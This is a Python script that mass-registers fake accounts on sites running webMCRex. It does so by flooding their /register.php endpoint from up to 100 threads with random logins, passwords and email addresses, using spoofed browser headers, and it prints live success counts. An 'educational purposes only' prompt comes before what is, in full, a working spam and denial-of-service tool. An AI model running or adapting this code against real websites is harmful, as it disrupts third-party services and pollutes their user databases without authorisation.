#!/usr/bin/env python3 

import requests
import threading
import random
import string
import time

disclaimer_agreement = input('By pressing enter you confirm that you have read disclaimer.txt and will use this script for educational purposes only, without making harm to anybody, anywhere, anytime.')
if disclaimer_agreement != '':
    exit('Sorry.')
print()

print('Enter URL of the webMCRex site. Including protocol, but without slash on the end.')
print('Example: https://example.com')
URL = input('URL: ')
if URL == '' or URL[-1] == '/' or URL[0:4] != 'http':
    exit('IDIOT!')

print('Set amount of threads. Recommended value is 10-20.')
THREADS = input('Threads [10]: ')
if THREADS == '':
    THREADS = 10
else:
    THREADS = int(THREADS)
if THREADS < 1 or THREADS > 100:
    exit('WTF A U DOING?')


# Generates random string from 5 to 14 symbols length
def random_string():
    length = random.randint(5, 14)
    return ''.join([random.choice(string.ascii_lowercase + string.digits) for _ in range(length)])

# Returns one of the listed providers
def random_mail_provider():
    return random.choice(('mail.ru', 'bk.ru', 'gmail.com', 'yandex.ru', 'ya.ru', 'yahoo.com'))

# Stats
successful_requests = 0
failed_requests = 0

headers = {
    'Origin': URL,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/61.0.3163.79 Chrome/61.0.3163.79 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Referer': URL+'/?mode=start',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.8,ru;q=0.6'
}


def flood():
    global successful_requests, failed_requests, URL
    while True:
        salt = random_string()
        data = {
            'login': salt,
            'pass': salt + '1',
            'repass': salt + '1',
            'email': random_string() + '@' + random_mail_provider(),
            'female': random.randint(0, 1)
        }
        r = requests.post(URL + '/register.php', headers=headers, data=data)
        if r.status_code == 200:
            if '"code":0' in r.text:
                successful_requests += 1
        else:
            failed_requests += 1

# Spawn threads
for _ in range(THREADS):
    threading.Thread(target=flood, daemon=True).start()

# Show stats
while True:
    try:
        print('Successful:', successful_requests, 'Failed:', failed_requests, end='\r')
        time.sleep(1)
    except KeyboardInterrupt:
        print('\n\nStopped.')
        exit()
